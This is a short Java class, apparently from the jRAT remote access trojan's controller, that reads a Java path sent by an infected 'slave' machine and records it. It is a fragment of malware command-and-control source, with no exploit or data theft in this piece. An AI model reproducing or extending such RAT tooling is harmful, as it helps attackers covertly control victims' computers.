package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import java.io.DataInputStream;


public class Packet15InitJavaPath extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {

		String path = slave.readLine();
		slave.setJavaPath(path);

	}
}